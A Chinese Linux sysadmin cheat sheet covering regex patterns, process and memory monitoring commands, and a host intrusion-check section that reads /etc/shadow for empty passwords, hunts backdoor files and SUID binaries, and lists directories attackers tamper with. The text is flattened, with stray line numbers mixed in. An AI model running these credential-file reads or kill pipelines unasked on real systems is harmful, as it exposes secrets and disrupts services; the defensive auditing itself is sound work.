‘^’表示不希望出现的字符，’^’应在方括号里的第一位;“(b¦cd)ef”：表示”bef”或”cdef”；123请注意表示范围:必须指定范围的下限;如：”{0,2}”而不是”{,2}”。2）’‘，’+’和’?’相当于”{0,}”，”{1,}”和”{0,1}”。3)’¦’，表示“或”操作。在方括号里用’^’表示不希望出现的字符，’^’应在方括号里的第一位，在方括号中，不需要转义字符。4) 和 + 限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个? 就可以实现非贪婪或最小匹配。通过在 *、+ 或 ? 限定符之后放置 ?，该表达式从”贪婪”表达式转换为”非贪婪”表达式或者最小匹配。5）其他字符匹配(Java正则表达式)：\\d ：匹配一个数字字符。[0-9]\\D ：匹配一个非数字字符。[^0-9]\\w ：匹配包括下划线的任何单词字符。[0-9a-zA-Z_]\\W ：匹配任何非单词字符。[^\\w]\\s ：匹配任何空白字符 空格、制表符、换行符\\S ：匹配任何非空白字符。12345678910115)定位符 定位符使您能够将正则表达式固定到行首或行尾。定位符用来描述字符串或单词的边界，^ 和 $ 分别指字符串的开始与结束，\\b 描述单词的前或后边界，\\B 表示非单词边界。 注意：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。 若要匹配一行文本开始处的文本，请在正则表达式的开始使用 ^ 字符。不要将 ^ 的这种用法与中括号表达式内的用法混淆。若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 $ 字符。 \\B 非单词边界运算符，位置并不重要，因为匹配不关心究竟是单词的开头还是结尾。 匹配中文字符的正则表达式： [\\u4e00-\\u9fa5]评注：匹配中文还真是个头疼的事，有了这个表达式就好办了匹配双字节字符(包括汉字在内)：[^\\x00-\\xff]评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）匹配空白行的正则表达式：\\n\\s\\r评注：可以用来删除空白行匹配HTML标记的正则表达式：&lt;(\\S*?)[^&gt;]&gt;.?&lt;&#x2F;\\1&gt;|&lt;.*? &#x2F;&gt;评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力匹配首尾空白字符的正则表达式：^\\s|\\s*$评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)评注：表单验证时很实用匹配网址URL的正则表达式：[a-zA-z]+:&#x2F;&#x2F;[^\\s]评注：网上流传的版本功能很有限，上面这个基本可以满足需求匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$评注：表单验证时很实用匹配国内电话号码：\\d{3}-\\d{8}|\\d{4}-\\d{7}评注：匹配形式如 0511-4405222 或 021-87888822匹配腾讯QQ号：[1-9][0-9]{4,}评注：腾讯QQ号从10000开始匹配中国邮政编码：[1-9]\\d{5}(?!\\d)评注：中国邮政编码为6位数字匹配身份证：\\d{15}|\\d{18}评注：中国的身份证为15位或18位匹配ip地址：\\d+.\\d+.\\d+.\\d+评注：提取ip地址时有用1234567891011121314151617181920212223242526匹配特定数字： ^[1-9]\\d*$ &#x2F;&#x2F;匹配正整数^-[1-9]\\d*$ &#x2F;&#x2F;匹配负整数^-?[1-9]\\d*$ &#x2F;&#x2F;匹配整数^[1-9]\\d*|0$ &#x2F;&#x2F;匹配非负整数（正整数 + 0）^-[1-9]\\d*|0$ &#x2F;&#x2F;匹配非正整数（负整数 + 0）^[1-9]\\d.\\d|0.\\d*[1-9]\\d*$ &#x2F;&#x2F;匹配正浮点数^-([1-9]\\d.\\d|0.\\d*[1-9]\\d*)$ &#x2F;&#x2F;匹配负浮点数^-?([1-9]\\d.\\d|0.\\d*[1-9]\\d*|0?.0+|0)$ &#x2F;&#x2F;匹配浮点数^[1-9]\\d.\\d|0.\\d*[1-9]\\d*|0?.0+|0$ &#x2F;&#x2F;匹配非负浮点数（正浮点数 + 0）^(-([1-9]\\d.\\d|0.\\d*[1-9]\\d*))|0?.0+|0$ &#x2F;&#x2F;匹配非正浮点数（负浮点数 + 0）12345678910匹配特定字符串： ^[A-Za-z]+$ &#x2F;&#x2F;匹配由26个英文字母组成的字符串^[A-Z]+$ &#x2F;&#x2F;匹配由26个英文字母的大写组成的字符串^[a-z]+$ &#x2F;&#x2F;匹配由26个英文字母的小写组成的字符串^[A-Za-z0-9]+$ &#x2F;&#x2F;匹配由数字和26个英文字母组成的字符串^\\w+$ &#x2F;&#x2F;匹配由数字、26个英文字母或者下划线组成的字符串1234512、高级命令组合SHELL显示多个信息，用EOFcat &lt;&lt; EOF+————————————————————–+| &#x3D;&#x3D;&#x3D; Welcome to Nginx Home &#x3D;&#x3D;&#x3D; |+————————————————————–+EOF12345获取IP地址ifconfig eth0 |grep “inet addr:” |awk ‘{print $2}’|cut -c 6- &#x2F;&#x2F;6-表从左第6个字符开始获取ifconfig eth0 |grep “inet “ |awk ‘{print $2}’|cut -c 6-或者ifconfig | grep ‘inet addr:’| grep -v ‘127.0.0.1’ | cut -d: -f2 | awk ‘{ print $1}’ifconfig | grep ‘inet ‘| grep -v ‘127.0.0.1’ | cut -d: -f2 | awk ‘{ print $2}’ 获取内存free -m |grep “Mem” | awk ‘{print $2}’ 查看连接某服务端口最多的的IP地址netstat -an -t | grep “:80” | grep ESTABLISHED | awk ‘{printf “%s %s\\n”,$5,$6}’ | sort 查看Apache的并发请求数及其TCP连接状态：netstat -n | awk ‘&#x2F;^tcp&#x2F; {++S[$NF]} END {for(a in S) print a, S[a]}’ 统计某一类文件大小eg1：find &#x2F; -name *.jpg -exec wc -c {} ;|awk ‘{print $1}’|awk ‘{a+&#x3D;$1}END{print a}’ 清除僵死进程ps -eal | awk ‘{ if ($2 &#x3D;&#x3D; “Z”) {print $4}}’ | kill -9 13、30个常用快捷键 14、运维实战a、系统负载查询确认1&gt;CPU负载情况1）查看逻辑CPU个数：cat &#x2F;proc&#x2F;cpuinfo |grep “processor”|sort -u|wc -l2）查看物理CPU个数：grep “physical id” &#x2F;proc&#x2F;cpuinfo|sort -u|wc -l3）查看每颗物理CPU核数：cat &#x2F;proc&#x2F;cpuinfo |grep “cores”|uniq每个物理CPU上逻辑CPU个数：grep “siblings” &#x2F;proc&#x2F;cpuinfo|uniq查看是否开启了抄超线程：如多个逻辑CPU的”physical id”和”core id”均相同，说明开启了超线程；逻辑如下：a.逻辑CPU个数 &gt; 物理CPU个数 * CPU内核数 开启了超线程b.逻辑CPU个数 &#x3D; 物理CPU个数 * CPU内核数 没有开启超线程4）查看CPU的主频：cat &#x2F;proc&#x2F;cpuinfo |grep MHz|uniq #!&#x2F;bin&#x2F;bash 定义初始变量physicalNumber&#x3D;0 coreNumber&#x3D;0 logicalNumber&#x3D;0 HTNumber&#x3D;0##获取系统参数值logicalNumber&#x3D;$(grep “processor” &#x2F;proc&#x2F;cpuinfo|sort -u|wc -l) physicalNumber&#x3D;$(grep “physical id” &#x2F;proc&#x2F;cpuinfo|sort -u|wc -l) coreNumber&#x3D;$(grep “cpu cores” &#x2F;proc&#x2F;cpuinfo|uniq|awk -F’:’ ‘{print $2}’|xargs) HTNumber&#x3D;$((logicalNumber &#x2F; (physicalNumber * coreNumber))) cpuHZ&#x3D;$(cat &#x2F;proc&#x2F;cpuinfo |grep MHz|uniq) echo “****** CPU Information ******” echo “Logical CPU Number : ${logicalNumber}” echo “Physical CPU Number : ${physicalNumber}” echo “CPU Core Number : ${coreNumber}” echo “HT Number : ${HTNumber}” echo “Systen cpu MHZ : ${cpuHZ}” echo “*****************************”123456789101112131415161718192021222324252627282930313233 5）top命令： 其中：load average这三个值，隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值;默认不超过cpu合数的2倍为好，超过2倍说明负载偏高；如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了；经验表明：每单核负载在3-5之间尚可，超过6甚至8，就要立刻排查cpu负载高的问题，否则极易宕机。检查%idle是否过低(比如小于5%)； us 用户空间占用CPU百分比； sy 内核空间占用CPU百分比；ni 用户进程空间内改变过优先级的进程占用CPU百分比；id 空闲CPU百分比；wa 等待输入输出的CPU时间百分比；hi 硬中断（Hardware IRQ）占用CPU的百分比；si 软中断（Software Interrupts）占用CPU的百分比；st 用于有虚拟cpu的情况，用来指示被虚拟机偷掉的cpu时间。 输出结果说明：PID：进程编号USER：进程所属用户PR&#x2F;NI：Priority&#x2F;Nice value进程执行的优先顺序VIRT：Virtual Image (kb) 虚拟内存使用总额；进程“需要的”虚拟内存大小，包括进程使用的库、代码、数据等，即使进程实际使用的远少于改值，但进程运行满载时会达到改值;VIRT&#x3D;SWAP+RESRES：Resident size (kb) 常驻内存，表进程当前使用的内存大小，包含其他进程的共享但不包括swap out；RES&#x3D;CODE+DATASHR：Shared Mem size (kb) 共享内存；除了自身进程的共享内存，也包括其他进程的共享内存，即使进程只使用了几个共享库的函数，但它用了整个共享库的大小来占用；因此, 某个进程所占的物理内存大小公式：RES – SHRS：Process Status 进程状态：D不可中断的睡眠状态 R运行态 S睡眠态 T跟踪&#x2F;停止态 Z僵尸态%CPU：cpu使用率%MEM：内存使用率TIME+：进程开始运行时使用cpu的总时间COMMAND：进程运行的命令第三行表示cpu的运行情况，按下1可以显示每个核的运行情况。 top默认排序是%CPU；shift+&gt; 或者shift+&lt; 向右或者向左切换排序基准，共12列，cpu为9列，mem为10列。按x高亮显示，可知道当前是哪一行为排序行。 默认进入top时，各进程是按照CPU的占用量来排序的。在top基本视图中，按键数字“1”可以监控每个逻辑CPU的状况；按键‘b’（打开关闭加亮效果）；‘y’来打开或者关闭运行态进程的加亮效果；‘x’（打开&#x2F;关闭排序列的加亮效果）；按”shift+&gt;”或者”shift+&lt;”左右改变排序序列；”f”可进入编辑基本视图中的显示字段； top -u root &#x2F;&#x2F;-u：user显示指定用户的进程 top -p 1 &#x2F;&#x2F;-p：pid显示指定进程 进入top后，按n：设置top屏幕显示的任务数 top -n 5 &#x2F;&#x2F;top -n num：设置top刷新的次数，指定刷新次数后将退出top，默认一直刷top -d 5 &#x2F;&#x2F;delay进入top后，top会定时刷新状态，默认值是5 s,-d参数指定top几秒刷新一次，即刷新频率top -b -n 60 -d 60 &gt; &#x2F;tmp&#x2F;cpu.txt &#x2F;&#x2F;-b：Batch mode批处理模式，top刷新状态默认是在原数据上刷新，使用-b参数后，会一屏一屏的显示数据。结合重定向功能和计划任务，-b参数在记录服务器运行状态时非常有用。 -M：Memory按照内存使用量排序-P：CPU按照cpu使用量排序进入top后按k键：（kill杀死PID的进程）top -H &#x2F;&#x2F;以线程方式查看top视图,等同于top内的H键 大写的 R 键可以将当前的排序倒转;6）自动记录cpu一段时间状态：top -b -n 60 -d 60 &gt; &#x2F;tmp&#x2F;cpu.txt 7）top -H -p 进程号 &#x2F;&#x2F;查看异常线程 8）查看占用cpu高的线程ps -H -eo user,pid,ppid,tid,time,%cpu,cmd –sort&#x3D;%cpu说明:‘H’，显示线程相关;-o指定显示的列； -T 显示线程数 linux下获取占用CPU资源最多的10个进程ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head 9）查看占用内存高的线程：ps aux | head -1;ps aux|sort -k4nr|head -5linux下获取占用内存资源最多的10个进程:ps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|headcat &#x2F;proc&#x2F;pid&#x2F;status &#x2F;&#x2F;查看该进程的内存占用情况10）查看进程按内存、cpu从大到小排序：ps -e -o “%C : %p : %z : %a”|sort -k5 -nrps -e -o “%C : %p : %z : %a”|sort -nr11）cat &#x2F;proc&#x2F;loadavg # 查看系统负载 2&gt;内存负载情况1）查看进程内存的状况：pmap PID; &#x2F;&#x2F;查看进程的内存映像信息 说明：-d：how the deviceformat. 显示设备格式-q quiet 不显示头尾行-x extended 显示扩展格式2）循环显示上述进程的输出的最后1行，间隔2秒:while true; do pmap -d 11957 | tail -1; sleep 2; done; 最后一行的值说明： mapped 表示该进程映射的虚拟地址空间大小，也就是该进程预先分配的虚拟内存大小，即ps出的vsz writeable&#x2F;private 表示进程所占用的私有地址空间大小，也就是该进程实际使用的内存大小 shared 表示进程和其他进程共享的内存大小 3）查看某进程的设备状态下的内存使用Address: 内存开始地址、Kbytes: 占用内存的字节数（KB）Mode: 内存的权限：read、write、execute、shared、private (写时复制)Offset: 文件偏移Mapping: 占用内存的文件、或[anon]（分配的内存）、或[stack]（堆栈）Device: 设备名 (major:minor) 3&gt;进程和线程异常情况1）查看当前站cpu最高的进程的线程使用情况：top -H -p ps aux|sort -k4nr|head -1|awk ‘{print $2}’ lsof -p pid（察看该进程所打开端口和文件）2）如上述输出有异常线程，可利用printf “%x\\n” 线程号，将异常线程号转化为16进制，用于后续的java线程跟踪用。printf “%x\\n” 12791 &#x2F;&#x2F;tid需要使用16进制值 3）查看java进程堆栈信息jstack 进程号|grep 16进制异常线程号 -A90 &#x2F;&#x2F;-A90是日志行数;查看运行的 Java 进程下，多线程的运行情况注意：jstack命令在jdk的bin目录下jstack -F 12791|grep 31f7 -A90 &#x2F;&#x2F;-F option can be used when the target process is not responding 线程状态有以下几种：RUNNABLE 线程运行中或 I&#x2F;O 等待BLOCKED 线程在等待 monitor 锁( synchronized 关键字)TIMED_WAITING 线程在等待唤醒，但设置了时限WAITING 线程在无限等待唤醒 如输出结果有GC，说明内存已经用尽； jstat -gcmetacapacity pid &#x2F;&#x2F;命令查看内存分布情况及GC情况 jstat -gcutil pid &#x2F;&#x2F;查看GC情况jstat -gccapacity pid 4)查看某进程的线程信息：ps -mp pid -o THREAD,tid,time|sort -rn &#x2F;&#x2F;tid为代码线程ID，time代表这个线程的已运行时间；jstack工具可以用来获得core文件的java stack和native stack的信息，从而可以轻松地知道java程序是如何崩溃和在程序何处发生问题，注：其中，LWP为轻量级进程，即线程PID；NLWP为线程数量；WCHAN表当前进程是否正在运行，若为-表示正在运行，若该进程在睡眠，则显示睡眠中的系统函数名； jps -v &#x2F;&#x2F;找到java进程相关的pid jstack -l 12791 &gt;&gt; 123.txt &#x2F;&#x2F;导出堆栈信息； 5)其他进程管理命令：htop、vmstat、dstat、iostat、glances，pstree、ps、pidof、pgrep、pkill、pmap、kill、killall、job、bg、fg等； 6）当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点。只要这个时候系统中还有进程正在访问该文件，那么我们就可以通过lsof从&#x2F;proc目录下恢复该文件的内容。 7)可运行进程数目 # vmwtat 1 5列给出的是可运行进程的数目，检查其是否超过系统逻辑CPU的4倍 top -id 1 &#x2F;&#x2F;观察是否有异常进程出现9)vmstat命令：vmstat是Virtual Meomory Statistics（虚拟内存统计）的缩写，可对操作系统的虚拟内存、进程、CPU活动进行监控。是对系统的整体情况进行统计，但不适于对某个具体进程进行深入分析。#vmstat 5 5 &#x2F;&#x2F;5秒时间内进行5次采样 输出结果字段说明： Procs（进程）： r: 运行队列中进程数量 b： 等待IO的进程数量 Memory（内存）： swpd: 使用虚拟内存大小 free: 可用内存大小 buff: 用作缓冲的内存大小 cache: 用作缓存的内存大小 Swap： si: 每秒从交换区写到内存的大小 so: 每秒写入交换区的内存大小 IO：（Linux默认块的大小为1024bytes） bi: 每秒读取的块数 bo: 每秒写入的块数 系统： in: 每秒中断数，包括时钟中断。【interrupt】 cs: 每秒上下文切换数。 【count&#x2F;second】 CPU（以百分比表示）： us: 用户进程执行时间(user time) sy: 系统进程执行时间(system time) id: 空闲时间(包括IO等待时间),中央处理器的空闲时间 。以百分比表示。 wa: 等待IO时间 指标参考： 如果r经常大于4，id经常少于40，表示cpu的负荷很重。 如果bi，bo长期不等于0，表示内存不足。 如果disk经常不等于0，且在b中的队列大于3，表示io性能不好。 示例：eg1：vmstat -a 2 5 &#x2F;&#x2F;-a 显示活跃和非活跃内存,所显示的内容将增加inact和active列，对应非活跃和活跃； eg2：vmstat -f &#x2F;&#x2F;查看linux下创建进程的系统调用。即fork次数，实际是从&#x2F;proc&#x2F;stat中的processes字段里取得的值 eg3：vmstat -s &#x2F;&#x2F;显示内存相关统计信息,包括已使用内存，活跃内存，实际取值于&#x2F;proc&#x2F;meminfo,&#x2F;proc&#x2F;stat和&#x2F;proc&#x2F;vmstat eg4：vmstat -d &#x2F;&#x2F;查看磁盘的读写,实际取之于&#x2F;proc&#x2F;diskstatsvmstat -p &#x2F;dev&#x2F;sda1 &#x2F;&#x2F;显示指定磁盘分区统计信息其中，输出结果：reads:来自于这个分区的读的次数。read sectors:来自于这个分区的读扇区的次数。writes:来自于这个分区的写的次数。requested writes:来自于这个分区的写请求次数。 eg5：vmstat -m &#x2F;&#x2F;查看系统的slab信息,用于存储i节点，目录项等小对象，避免为他们消耗一个内存页（4kb），减少内存分配次数。际取值于&#x2F;proc&#x2F;slabinfo eg6： 10）ps命令： 常用参数： -A 显示所有进程（等价于-e）(utility)-a 显示一个终端的所有进程，除了会话引线-N 忽略选择。-C 通过命令名称搜索进程，后面跟你要找的进程的名字即可-d 显示所有进程，但省略所有的会话引线(utility)-x 显示没有控制终端的进程，同时显示各个命令的具体路径。dx不可合用。（utility）-p pid 进程使用cpu的时间-u uid or username 选择有效的用户id或者是用户名， 如果长度大于8个字符，然后ps将只显示UID，而不是用户名；多个用户名可以提供以逗号分隔。-g gid or groupname 显示组的所有进程。U username 显示该用户下的所有进程，且显示各个命令的详细路径。如:ps U zhang;(utility)-f -forest全部列出，通常和其他选项联用。如：ps -fa or ps -fx and so on.-l 长格式（有F,wchan,C 等字段）-L 查看特定进程的线程-j 作业格式-o 用户自定义格式。v 以虚拟存储器格式显示s 以信号格式显示-m 显示所有的线程-H 显示进程的层次(和其它的命令合用，如：ps -Ha)（utility）e 命令之后显示环境（如：ps -d e; ps -a e）(utility)h 不显示第一行–sort 选项由逗号分隔的多个字段可以用指定，–sort&#x3D;-pcpu,+pmem（或–sort +pmem,-pcpu），cpu降序排列，内存升序排列。 ps命令参数使用支持以下3种风格： 1）BSD风格: 在 BSD 风格的语法选项前不带连字符。例如: ps aux2）UNIX&#x2F;LINUX的风格：在 linux 风格的语法选项前面有一个 “-”。例如: ps -ef3）混合使用两种 Linux 系统上的语法风格是好事儿。例如：ps ax -f eg1：# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND 其中：VSZ 进程所使用的虚存的大小（Virtual Size）；RSS表进程使用的驻留集大小或者是实际内存的大小，Kbytes字节。STAT即进程的状态：使用不通字符表示（STAT的状态码），主要15种状态码如下： R 运行 Runnable (on run queue) &#x2F;&#x2F;正在运行或在运行队列中等待。S 睡眠 Sleeping &#x2F;&#x2F;休眠中, 受阻, 在等待某个条件的形成或接受到信号。I 空闲 IdleZ 僵死 Zombie（a defunct process) &#x2F;&#x2F;进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放。D 不可中断 Uninterruptible sleep (ususally IO) &#x2F;&#x2F;收到信号不唤醒和不可运行, 进程必须等待直到有中断发生。T 终止 Terminate &#x2F;&#x2F;进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行。P &#x2F;&#x2F;等待交换页W 无驻留页 has no resident pages &#x2F;&#x2F; 没有足够的记忆体分页可分配。X &#x2F;&#x2F;死掉的进程&lt; 高优先级进程 &#x2F;&#x2F;高优先序的进程N 低优先级进程 &#x2F;&#x2F;低优先序的进程L 内存锁页 Lock &#x2F;&#x2F; 有记忆体分页分配并缩在记忆体内s &#x2F;&#x2F;进程的领导者（在它之下有子进程）l &#x2F;&#x2F;多进程的（使用 CLONE_THREAD, 类似 NPTL pthreads） &#x2F;&#x2F;位于后台的进程组 WCHAN 表进程正在睡眠的内核函数名称；该函数的名称是从&#x2F;root&#x2F;system.map文件中获得的。 eg2：自定义输出结果并按需排序 ps -eo pid,stat,pri,uid –sort uid &#x2F;&#x2F;查看当前系统进程的uid,pid,stat,pri, 以uid号排序. ps -eo user,pid,stat,rss,args –sort rss &#x2F;&#x2F;查看当前系统进程的user,pid,stat,rss,args, 以rss排序. eg3：结合 watch命令实时显示进程运行情况 #watch -n 1 ‘ps -aux –sort -pmem,-pcpu’ &#x2F;&#x2F;1s刷新一次，按cpu和内存排序 watch -n 1 ‘ps -aux –sort -pmem,-pcpu|head -10’ &#x2F;&#x2F;动态显示前10行 11）优先级命令nice： 用法： nice &lt;优先值&gt; &lt;进程名&gt; &#x2F;&#x2F;通过给定的优先值启动一个程序 通过以上命令用户就可以设置和改变进程的优先级。提高一个进程的优先级，内核会分配更多CPU时间片给这个进程。默认情况下，进程以 0 的优先级启动。进程优先级可以通过 top 命令显示的 NI（nice value）列查看。进程优先级值的范围从-20到19。值越低，优先级越高。 类似命令renice：renice 命令类似 nice 命令，但它可以改变正在运行的进程优先值且用户只能改变属于他们自己的进程的优先值。 renice -n -p &#x2F;&#x2F;改变指定进程的优先值 renice -u -g &#x2F;&#x2F;通过指定用户和组来改变进程优先值 12）ipcs命令 ： ipcs 命令报告进程间通信设施状态。（包括共享内存，信号量和消息队列） eg1：# ipcs -p -m &#x2F;&#x2F;查看当前共享内存情况，-s查看信号量集合，-a等同于-msq eg2:# ipcs -p -q &#x2F;&#x2F;查看当前活动消息队列 b、系统安全检查1）检查系统中是否有其他特权用户：awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;检查是否存在其他特权账户，默认只有rootcat &#x2F;etc&#x2F;passwd;stat &#x2F;etc&#x2F;passwd &#x2F;&#x2F;检查是否异常用户，及用户和密码文件状态及修改的日期awk -F: ‘length($2)&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;shadow检查是否存在空口令账户.awk -F: ‘length($2)&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;shadow检查是否存在空口令账户.last|head;lastb;wless &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;查看ssh的登录日志2）ps -p PID -o lstart 检查上一次syslog启动时间是否正常 3）检查是否有以rhosts或者以forward结尾的后门文件,判断是否遭到入侵find &#x2F; -name “.rhosts” -printfind &#x2F; -name “.forward” -printls &#x2F;var&#x2F;spool&#x2F;cron&#x2F;less &#x2F;etc&#x2F;rc.d&#x2F;rc.localls &#x2F;etc&#x2F;rc.dls &#x2F;etc&#x2F;rc.dfind &#x2F; -type f -perm 4000lsmod4）检查&#x2F;var&#x2F;log日志是否被清理ls -al &#x2F;var&#x2F;log&#x2F;* &#x2F;&#x2F;尤其wtmp和utmp检查 sshd 服务配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config 和系统认证日志 auth、message，判断是否为口令破解攻击。&#x2F;etc&#x2F;ssh&#x2F;sshd_config 文件确认认证方式。确认日志是否被删除或者清理过的可能（大小判断）。5） 查看&#x2F;var&#x2F;log&#x2F;secure日志文件，查看是否有入侵者的信息cat &#x2F;var&#x2F;log&#x2F;secure | grep -i “accepted password”检查日志报错：grep -i error或fail &#x2F;var&#x2F;log&#x2F;messages 6） 检查守护进程ps -ajx &#x2F;&#x2F;所有的守护进程都是以超级用户启动的(UID为0)；没有控制终端(TTY为？)；终端进程组ID为-1(TPGID表示终端进程组ID，该值表示与控制终端相关的前台进程组，如果未和任何终端相关，其值为-1； 参数说明：-a: 显示所有-x：显示没有控制终端的进程-j：显示与作业有关的信息（显示的列）：会话期ID（SID），进程组ID（PGID），控制终端（TTY），终端进程组ID（TRGID）7）查找隐藏进程：ps -ef|awk ‘{print }’|sort -n|uniq&gt;1ls &#x2F;proc&#x2F;|sort -n|uniq &gt;28）检查权限过开文件find &#x2F; -uid 0 -perm -4000 -printfind &#x2F; -size +10000k -print &#x2F;&#x2F;注意SUID文件，可疑大于10M和空格文件find &#x2F; -name “…” -printfind &#x2F; -name “ “ -printfind &#x2F; -name “.” -print9)检查系统中的core文件find &#x2F; -name core -exec ls -l {} ;10)检查系统文件完整性rpm -qf &#x2F;bin&#x2F;lsrpm -qf &#x2F;bin&#x2F;loginmd5sum -b 关键文件名md5sum -t 关键文件名日常运维时，可将一些重要的文件的md5值保存，作为之后变化的参照 #!&#x2F;bin&#x2F;bashexport path&#x3D;$PATH:&#x2F;rootmd5sum &#x2F;etc&#x2F;passwd &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;etc&#x2F;shadow &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;etc&#x2F;group &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;usr&#x2F;bin&#x2F;passwd &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;sbin&#x2F;portmap&gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;bin&#x2F;login &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;bin&#x2F;ls &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;bin&#x2F;ps &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;usr&#x2F;bin&#x2F;top &gt;&gt;&#x2F;etc&#x2F;md5db123456789101111）检查RPM：rpm -Va &#x2F;&#x2F;列出当前系统中安装后，所有变化过的包文件，可以以此来检查文件包的完整性，安全性等其中：S – File sizeM – Mode不同权限5 – MD5 sumD – Device number c表示文件为配置文件。其他标志有： d %doc 说明文档；g %ghost 不应包含的文档，有可能有问题；l %license 授权文件；r %readme readme说明文件。 注意相关的 &#x2F;sbin, &#x2F;bin, &#x2F;usr&#x2F;sbin, and &#x2F;usr&#x2F;bin 12)检查文件的变化： ls -Xal –time-style&#x3D;+%D | grep ‘date +%D’ &#x2F;&#x2F;只列出当前目录当天修改的文件，-X 标志来按字母顺序对结果排序，-S 标志来基于大小（由大到小）来排序find . -maxdepth 1 -newermt “2020-09-13”find . -maxdepth 1 -newermt “09&#x2F;13&#x2F;2020”或者# find . -maxdepth 1 -newermt “2020&#x2F;09&#x2F;13” 13）查看网络连接 netstat -atlpv &#x2F;&#x2F;看正在网络通讯的进程和socket连接状态 iftop &#x2F;&#x2F;看活跃的网络通讯以及流量 抓包分析：tcpdump -w tcpdump.log &#x2F;&#x2F;将tcpdump.log保存成 pcap 格式导入到 wiresharktcpdump -c 10000 -i eth0 -n dst port 80 &gt; &#x2F;root&#x2F;pkts 查看http的并发请求数及其TCP连接状态：netstat -n | awk ‘&#x2F;^tcp&#x2F; {++S[$NF]} END {for(a in S) print a, S[a]}’ 查看cache里的URLgrep -r -a jpg &#x2F;var&#x2F;cache&#x2F;* | strings | grep “http:” | awk -F’http:’ ‘{print “http:”$2;}’ 查看网络负载： # sar -n DEV &#x2F;&#x2F;检查网络流量(rxbyt&#x2F;s, txbyt&#x2F;s)是否过高网络错误 # netstat -i &#x2F;&#x2F;检查是否有网络错误(drop fifo colls carrier) 也可以用命令：# cat &#x2F;proc&#x2F;net&#x2F;dev 14）文件被黑的常见形式：&#x2F;bin （替换基本工具为恶意木马等，比如netstat，ps等）&#x2F;sbin （替换基本工具为恶意木马等，比如sshd，lsof，ss等）&#x2F;usr&#x2F;bin（替换基本工具为恶意木马等，比如sshd，lsof，ss等）&#x2F;usr&#x2F;sbin （替换基本工具为恶意木马等，比如sshd，lsof，ss等）&#x2F;etc&#x2F;init.d （修改开机启动任务，添加恶意脚本开机启动）&#x2F;etc&#x2F;&#x2F;etc&#x2F;cront.d （修改计划任务，添加恶意脚本定时执行）&#x2F;etc&#x2F;crontab （修改计划任务，添加恶意脚本定时执行）~&#x2F;.ssh&#x2F;目录 (注入公钥)&#x2F;etc&#x2F;sysconfig （修改iptables配置等，开放网络限制）&#x2F;etc&#x2F;ssh&#x2F; （修改ssh配置）web目录 （修改网站）需定时检查上述目录下文件被替换或者添加非法文件。 #find &#x2F;usr&#x2F;bin -m -1 &#x2F;&#x2F;查看一天内&#x2F;usr&#x2F;bin目录下变化过的文件#find &#x2F;var -type f -mtime -1 -exec ls -al {} ; 15）杀掉进程示例如下：ps aux |grep p_name |grep -v grep |awk ‘{print $2}’ |xargs kill -9 (从中了解到awk的用途)killall -TERM 服务名kill -9 cat &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;logs&#x2F;httpd.pid 试试查杀进程PID16）显示运行3级别开启的服务ls &#x2F;etc&#x2F;rc3.d&#x2F;S* |cut -c 15- &#x2F;&#x2F;注意cut截取字符17）.打开文件数目 # lsof | wc -l &#x2F;&#x2F;检查打开文件总数是否过多 c、系统启动异常处理及备份1&gt;Linux系统启动引到过程（BRGKi） ●开机自检：检测出第一个能够引导系统的设备，比如硬盘或者光驱。服务器主机开机以后，将根据主板BIOS中的设置对CPU、内存、显卡、键盘等硬件设备进行初步检测，检测成功后根据预设的启动顺序移交系统控制权，大多时候会移交给本机硬盘，因为操作系统一般都是装在硬盘内。●MBR 引导：运行放在MBR扇区里的启动GRUB引导程序。当从本机硬盘中启动系统时，首先根据硬盘第一个扇区中MBR（主引导记录）的设置，将系统控制权传递给包含操作系统引导文件的分区；或者直接根据MBR记录中的引导信息调用启动菜单。例如：GRUB等●GRUB 菜单：GRUB引导程序通过读取GRUB配置文件**&#x2F;boot&#x2F;grub2&#x2F;grub.cfg**，来获取内核和镜像文件系统的设置以及路径位置。对于Linux操作系统来说，GRUB（统一启动加载器）是使用最为广泛的多系统引导器程序，系统控制权传递给GRUB以后，将会显示启动菜单给用户选择，并根据所选项（或采用默认值）加载Linux内核文件，然后将系统控制权转交给内核。（CentOS 